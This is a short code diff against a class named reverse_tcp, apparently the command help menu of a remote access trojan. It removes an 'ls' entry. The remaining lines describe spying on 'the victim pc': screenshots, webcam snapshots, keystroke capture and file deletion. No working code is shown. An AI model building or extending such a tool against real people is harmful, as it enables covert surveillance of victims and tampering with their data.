@@ -122,7 +122,6 @@ class reverse_tcp:
 screenshot: takes a screenshot in the victim pc
 webcam_snap: takes a webcam snapshot in the victim pc
 keyboard_snap: takes the keys that are pressed on the victim pc
-ls: prints all the files and directories
 getcwd: get the current working directory
 cd: It allows you to move through folders, example cd Folder
 rm: It allows you to delete a file or a directory, example rm file
